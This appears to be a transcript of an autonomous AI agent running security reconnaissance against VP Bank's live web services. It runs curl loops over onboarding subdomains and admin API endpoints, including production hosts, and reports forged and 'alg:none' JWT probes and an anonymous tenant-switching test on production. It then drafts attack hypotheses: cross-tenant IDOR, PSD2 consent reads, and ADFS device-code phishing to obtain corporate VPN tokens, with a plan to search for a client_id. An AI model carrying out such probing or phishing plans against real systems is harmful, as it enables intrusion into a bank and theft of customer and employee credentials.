+[0m$ [0mcd /tmp/opencode/do && for sub in "digital-onboarding-app" "digital-onboarding-api" "digital-onboarding-admin" "digital-onboarding-backoffice" "digital-onboarding-portal"; do echo "=== $sub.vpbank.com ==="; curl -s -k -m 10 -o /tmp/opencode/do/r.txt -w "HTTP %{http_code} size=%{size_download} " "https://$sub.vpbank.com/"; head -c 120 /tmp/opencode/do/r.txt | tr -d '\n'; echo; sleep 1; done
+=== digital-onboarding-app.vpbank.com ===
+HTTP 000 size=0 {"message":"invalid token","additional":"Nil JSON web token"}
+=== digital-onboarding-api.vpbank.com ===
+HTTP 000 size=0 {"message":"invalid token","additional":"Nil JSON web token"}
+=== digital-onboarding-admin.vpbank.com ===
+HTTP 000 size=0 {"message":"invalid token","additional":"Nil JSON web token"}
+=== digital-onboarding-backoffice.vpbank.com ===
+HTTP 000 size=0 {"message":"invalid token","additional":"Nil JSON web token"}
+=== digital-onboarding-portal.vpbank.com ===
+HTTP 000 size=0 {"message":"invalid token","additional":"Nil JSON web token"}
+[0m
+Let me quickly probe the last remaining untested anonymous endpoints from the extracted route map on dev before finalizing.
+[0m$ [0mcd /tmp/opencode/do && for p in "api/v1/documentsmanagement" "admin/api/v1/auditlog" "admin/api/v1/deletion_log" "admin/api/v1/rights_and_roles/tenant_variant_groups" "admin/api/v1/rights_and_roles/admin_users"; do echo "=== dev /$p ==="; curl -s -k -m 12 -o /tmp/opencode/do/r.txt -w "HTTP %{http_code} size=%{size_download} " "https://digital-onboarding-dev.vpbank.com/$p"; head -c 140 /tmp/opencode/do/r.txt | tr -d '\n'; echo; sleep 1; done
+=== dev /api/v1/documentsmanagement ===
+HTTP 404 size=1793 <!DOCTYPE html><html><head>  <title>404 error</title>  <meta name="viewport" content="width=device-width,initial-scale=1">  <meta http-
+=== dev /admin/api/v1/auditlog ===
+HTTP 404 size=1793 <!DOCTYPE html><html><head>  <title>404 error</title>  <meta name="viewport" content="width=device-width,initial-scale=1">  <meta http-
+=== dev /admin/api/v1/deletion_log ===
+HTTP 401 size=61 {"message":"invalid token","additional":"Nil JSON web token"}
+=== dev /admin/api/v1/rights_and_roles/tenant_variant_groups ===
+HTTP 401 size=61 {"message":"invalid token","additional":"Nil JSON web token"}
+=== dev /admin/api/v1/rights_and_roles/admin_users ===
+HTTP 401 size=61 {"message":"invalid token","additional":"Nil JSON web token"}
+[0m
+Recon complete. The digital-onboarding data layer is uniformly JWT-gated with signature verification enforced — no anonymous data access, and JWT-confusion/mass-assignment hypotheses are largely falsified on the sandbox. Here's my structured analysis.
+
+---
+
+**STEP 1 — DELTA**
+- NEW: Extracted full production admin route map from the `/control-center/` JS bundle (`index-w2wOeele.js` + 26 duck chunks): `/admin/api/v1/{users, users/process_list, users/download_basic_info, users/import, users/import/template, users/:id/emails, rights_and_roles/{admin_users,users,admin_roles,tenant_variants,tenant_variant_groups}, ident_only_cases, poa_cases, editsign_cases, wallet_accounts, mailing_lists, fees, admins, permissions, permissions_sets, audit_log, deletion_log, search/agree21, incoming_wires/calculate_exchange_rate}` + `/api/v1/{sessions, sessions/idp_login, sessions/secure_session, sessions/reset_password, tenants, brand, current_user_details, qr_codes/generate, documentsmanagement}` + `/rails/active_storage/direct_uploads`.
+- NEW: Anonymous tenant-context switching verified on **prod** (`digital-onboarding.vpbank.com/api/v1/brand?force_tenant=vpbank` → different tenant's config, HTTP 200); client-controlled `FORCE_TENANT` appended to every API request by the SPA; tenant selector server-honored without auth.
+- NEW: dev/stage `/api/v1/tenants` → HTTP 200 `{}` anonymously vs prod → HTTP 403 "Not authorized" — per-endpoint authz differential.
+- NEW: JWT posture verified on dev sandbox (synthetic data): anonymous admin endpoints → 401 "Nil JSON web token"; forged HS256 → 401 "Signature verification failed"; `alg:none` → 401 "Expected a different algorithm" — signature/alg enforcement confirmed, no confusion vector.
+- NEW: `/api/v1/qr_codes/generate` → 401 "2fa not enabled for provided tenant" — tenant context read from request even anonymous; reveals login POSTs `{"user":{...}}` to `/api/v1/sessions` (mass-assignment surface).
+
+**STEP 2 — PRIORITIZE**
+- [PRIO] developer.vpbank.com,8.40,attack_surface=9,business_value=9,tech_exposure=8,gate_ease=10,cloud_surface=2,freshness=10
+- [PRIO] digital-onboarding.vpbank.com,7.45,attack_surface=8,business_value=8,tech_exposure=7,gate_ease=8,cloud_surface=2,freshness=10
+- [PRIO] sts.vpbank.com,6.30,attack_surface=5,business_value=7,tech_exposure=6,gate_ease=10,cloud_surface=1,freshness=8
+- [PRIO] www.vpbank.com,6.25,attack_surface=6,business_value=10,tech_exposure=9,gate_ease=2,cloud_surface=2,freshness=4
+- [PRIO] openbanking.vpbank.com,5.50,attack_surface=3,business_value=10,tech_exposure=8,gate_ease=1,cloud_surface=2,freshness=7
+
+**STEP 3 — HYPOTHESES**
+[HYP] force_tenant cross-tenant session/data IDOR on digital-onboarding back-office
+class: IDOR
+asset: digital-onboarding.vpbank.com/
+confidence: 50
+reasoning: SPA appends client-controlled `force_tenant` to every API request including session creation (bundle code: `o.force_tenant=It.get("FORCE_TENANT")` appended in `Dx` call layer); prod `/api/v1/brand?force_tenant=vpbank` returns HTTP 200 with second tenant config anonymously (tenant scoping honored server-side); `/api/v1/qr_codes/generate` returns "2fa not enabled for provided tenant" — tenant context is read from request. If a low-priv session's JWT tenant claim can be influenced by force_tenant at POST /api/v1/sessions (body `{"user":{...}}` + store `FORCE_TENANT`), cross-tenant onboarding-case/wire/ident reads follow.
+evidence_needed: login to dev/stage sandbox with any account, then repeat the same request with force_tenant=vpbank and observe data set switch or unauthorized access to /admin/api/v1/ident_only_cases, /admin/api/v1/incoming_wires
+verify_steps: GET https://digital-onboarding-dev.vpbank.com/api/v1/brand?force_tenant=vpbank (200, baseline tenant switch). Login→GET /admin/api/v1/users?force_tenant=vpbank from tenant-A session; 200 with tenant-B records = cross-tenant IDOR (dev sandbox only, requires valid dev creds).
+impact: Cross-tenant PII/financial disclosure (onboarding cases, ident docs, wires, mailing lists) across tenants of a bank onboarding SaaS; severity HIGH
+testability: AUTH_HELPED
+[HYP] ADFS device_code grant token theft via phishing on sts.vpbank.com
+class: OAUTH
+asset: sts.vpbank.com/adfs
+confidence: 55
+reasoning: /adfs/.well-known/openid-configuration exposes device_code+password+implicit grants (issuer sts.vpbank.com/adfs, scopes vpn/logon/cert); /adfs/oauth2/token/devicecode returns 405 on GET, endpoint exists; device-flow adversariably polls for victim approval (phishing to enter user code on attacker device) yielding vpn/logon tokens.
+evidence_needed: valid client_id + successful devicecode POST to observe user_code/verification_uri; RAG might surface ADFS client_id in VP Bank docs/portal
+verify_steps: POST https://sts.vpbank.com/adfs/oauth2/token/devicecode 'client_id=<found>&scope=vpn' → 200 with user_code/verification_uri proves flow usable (requires client_id discovery; token issuance requires HUMAN victim approval)
+impact: Corporate VPN/cert-scope tokens via device-flow phishing → internal network lateral movement; severity HIGH
+testability: AUTH_HELPED
+[HYP] PSD2 sandbox authorization model carries to production (cross-TPP Consent-ID read)
+class: IDOR
+asset: openbanking.vpbank.com
+confidence: 35
+reasoning: Sandbox proves zero session/TPP binding on consentId/paymentId chain; docs list only TPP auth/user-interaction as deltas; production authorizes via TLS mTLS only (blocked anonymously).
+evidence_needed: two QWAC certs cross-reading Consent-ID on production
+verify_steps: HUMAN_ONLY — TPP-A consent, TPP-B reads /consents/{id}/status on openbanking.vpbank.com/psd2/berlin-group/v1
+impact: Cross-TPP production consent/account/ledger disclosure; severity HIGH
+testability: HUMAN_ONLY
+
+**STEP 4 — SELF-CRITIQUE**
+- DROP: Mass-assignment on Devise sign_in (conf 70→40): login body is `{"user":{}}` over `/api/v1/sessions` but all admin data endpoints enforce JWT; sandbox forged-token probes show signature verification — mass-assignment would require valid creds (untestable, no creds; auth-bypass against live customer data prohibited). [PARKED] Mass assignment on sign_in: no valid dev creds to verify, login routes JWT-gated; evidence of strong_parameters enforcement plausible.
+- [PARKED] PSD2 prod carryover (conf 35 < 40): mTLS blocks anonymous verification; HUMAN_ONLY eIDAS certs required.
+- [PARKED] force_tenant brand-config disclosure alone (severity LOW, config/theming only, tenant ids identical config) — not reportable standalone; kept only as evidence for the cross-tenant IDOR hypothesis.
+- [FINAL] 1. [80] PSD2 sandbox BOLA/IDOR — PROVEN end-to-end in official sandbox; report artifact ready (synthetic data).
+- [FINAL] 2. [55] ADFS device_code phishing on sts.vpbank.com.
+- [FINAL] 3. [50] force_tenant cross-tenant IDOR on digital-onboarding (AUTH_HELPED, needs dev creds).
+
+**STEP 5 — NEXT ACTION**
+[NEXT] RAG: hunt for a VP Bank/ADFS `client_id` for sts.vpbank.com device_code flow (search VP Bank eBanking/secure docs, GitHub, "vpbank" + "adfs", IT-support KBs); once found → PROBE POST https://sts.vpbank.com/adfs/oauth2/token/devicecode `client_id=<id>&scope=vpn` (200 with user_code/verification_uri = device-flow phishing confirmed).
+
+**STEP 6 — LEARNING**
+- [LEARN] ACCEPTED MISCONFIG @ digital-onboarding.vpbank.com: Anonymous `force_tenant` parameter switches tenant context on `/api/v1/brand` on prod/dev/stage (HTTP 200, tenant id `vpbank` enumerated); FORCE_TENANT client-controlled on every API call — server-honored tenant selector fingerprint for cross-tenant IDOR.
+- [LEARN] REJECTED AUTH @ digital-onboarding-dev.vpbank.com (JWT confusion): forged HS256 → "Signature verification failed", `alg:none` → "Expected a different algorithm", anonymous admin endpoints → 401 "Nil JSON web token" — signature/alg enforced, no anonymous data access on any of 20+ admin endpoints (prod and dev).
+- [LEARN] REJECTED MISCONFIG @ digital-onboarding.vpbank.com (anonymous admin data access): all 20+ `/admin/api/v1/*` endpoints return 401 anonymously on prod AND dev; dev/stage `/api/v1/tenants` 200 `{}` vs prod 403 — only per-endpoint authz differential, no data leak.
+- [LEARN] NEW INFO @ digital-onboarding.vpbank.com: Complete back-office route/endpoint map exposed in anonymous SPA JS bundle (users, ident cases, POA, editsign, wallet_accounts/IBANs, mailing lists, fees, audits, wire exchange-rate calc, active_storage direct_uploads) — recon value for report.
+
+**STEP 7 — RISK**
+[RISK] vp-bank-ag: 57 — unchanged. Confirmed PSD2 sandbox BOLA (reportable, synthetic) remains the flagship; digital-onboarding depth-probe shows the data layer is JWT+signature-enforced (no anonymous data access, no JWT confusion), so the anonymous attack surface is limited to the SPA route map + tenant-config enumeration (low); residual risk concentrated in (a) proven BOLA with unverified prod carryover (mTLS-gated), (b) client-controlled force_tenant mechanism that could enable cross-tenant access for any authenticated low-priv user, (c) ADFS device-flow phishing. OAuth (client_id-gated), staging (WAF), api.vpbank.com (exhausted), openbanking (mTLS), mass-assignment (unverifiable without creds).
